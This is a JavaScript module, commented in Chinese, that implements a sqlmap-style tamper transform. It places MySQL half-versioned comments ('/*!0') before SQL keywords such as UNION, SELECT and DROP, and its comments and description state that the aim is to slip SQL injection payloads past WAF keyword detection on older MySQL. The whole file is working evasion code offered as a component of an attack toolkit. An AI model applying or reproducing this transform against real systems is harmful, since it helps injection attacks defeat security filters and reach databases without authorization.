// MySQL 半版本化注释：在每个关键字前添加 /*!0（仅开注释不闭合，依赖 MySQL < 5.1 的注释解析特性）
// 对标 sqlmap halfversionedmorekeywords：/*!0UNION/*!0SELECT — 旧版 MySQL 将 /*!0 视为版本 0 条件注释，
// 关键字仍被执行；WAF 看到 /*! 前缀则按注释跳过关键字识别 → 绕过
const KW =
  'SELECT|UNION|ALL|DISTINCT|FROM|WHERE|AND|ORDER|BY|GROUP|HAVING|LIMIT|OFFSET|INSERT|UPDATE|DELETE|INTO|VALUES|SET|DROP|CREATE|TABLE|DATABASE|VERSION|JOIN|ON|BETWEEN|LIKE|NULL|IS|IN|NOT|AS';
const RE = new RegExp(`\\b(${KW})\\b`, 'gi');

export const halfversionedmysql = {
  name: 'halfversionedmysql',
  description: '在每个关键字前添加 /*!0 半版本化注释（MySQL < 5.1 执行），绕过 WAF 关键字检测',
  transform(payload) {
    return payload.replace(RE, (m) => '/*!0' + m);
  },
};

export default halfversionedmysql;
